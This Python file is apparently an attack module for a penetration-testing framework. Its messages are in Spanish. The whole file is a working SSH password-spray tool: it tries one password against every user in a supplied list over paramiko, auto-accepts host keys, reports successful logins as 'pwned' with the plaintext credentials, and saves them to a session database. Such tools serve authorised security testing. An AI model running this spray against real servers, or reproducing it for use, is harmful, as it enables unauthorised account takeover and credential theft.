# scripts/ssh/attack/password_spray.py
import time
import paramiko
from scripts.base import BaseScript
from core.output import print_result, console
from core import session_db

class Script(BaseScript):
    name        = "password-spray"
    protocol    = "ssh"
    category    = "attack"
    description = "Spray de contraseñas SSH contra una lista de usuarios con delay configurable."

    EXAMPLES = [
        {"flag": "--userlist / -p", "desc": "Lista de usuarios y contraseña única",
         "good": "ssh --script=password-spray -t 10.10.10.5 --userlist users.txt -p 'Pass123'",
         "bad":  "ssh --script=password-spray -t 10.10.10.5 -p 'x' (sin userlist)"},
    ]

    def run(self, **kwargs):
        port     = int(kwargs.get("port") or 22)
        timeout  = int(kwargs.get("timeout") or self.target.timeout or 5)
        userlist = kwargs.get("userlist")
        password = self.creds.password or kwargs.get("password") or ""
        delay    = float(kwargs.get("delay") or 1)
        ip       = self.target.ip

        if not userlist:
            console.print("[red]Falta --userlist.[/red]"); return None
        if not password:
            console.print("[red]Falta -p/--password.[/red]"); return None

        try:
            with open(userlist) as f:
                users = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        except OSError as e:
            console.print(f"[red]No se pudo leer {userlist}: {e}[/red]"); return None

        print_result("SSH", ip, "info",
                     f"password spray: {len(users)} usuario(s)")

        valid = []
        for user in users:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=user, password=password,
                               timeout=timeout, allow_agent=False, look_for_keys=False)
                client.close()
                valid.append(user)
                print_result("SSH", ip, "pwned", f"login correcto: {user}:{password}")
                session_db.save_credential(ip, user, password, "password",
                                           valid=True, source="ssh_spray")
            except paramiko.AuthenticationException:
                print_result("SSH", ip, "fail", f"fallido: {user}")
            except Exception as e:
                print_result("SSH", ip, "fail", f"error con {user}: {e}")
            if delay:
                time.sleep(delay)

        if valid:
            print_result("SSH", ip, "pwned",
                         f"spray: {len(valid)} credencial(es) válida(s)")
        else:
            print_result("SSH", ip, "info", "spray: sin credenciales válidas")

        return valid
